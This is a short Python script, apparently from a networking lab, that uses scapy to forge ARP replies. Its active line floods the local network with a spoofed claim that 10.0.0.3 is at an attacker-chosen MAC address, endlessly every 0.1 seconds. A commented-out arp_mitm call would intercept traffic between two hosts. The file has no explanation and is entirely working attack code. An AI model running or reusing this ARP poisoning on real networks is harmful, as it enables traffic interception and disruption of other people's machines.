#!/usr/bin/env python3
from scapy.all import send, sendp, sniff, sr1, srp
from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether, getmacbyip, arp_mitm

target_mac = "42:42:42:42:42:42"
source_ip = "10.0.0.42"
target_ip = "10.0.0.2"

WHO_HAS = 1
IS_AT = 2

ether_layer = Ether(dst="42:42:42:42:42:42")
arp_layer = ARP(
    op=2, pdst=target_ip, hwdst="42:42:42:42:42:42", hwsrc=target_mac, psrc=source_ip
)

# sendp(ether_layer / arp_layer, iface="eth0")

ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
arp_layer = ARP(
    op=IS_AT, hwsrc="d6:8a:c9:a4:8e:11", psrc="10.0.0.3"
)

sendp(ether_layer / arp_layer, iface="eth0", loop=1, inter=0.1)

# arp_mitm("10.0.0.2", "10.0.0.3")
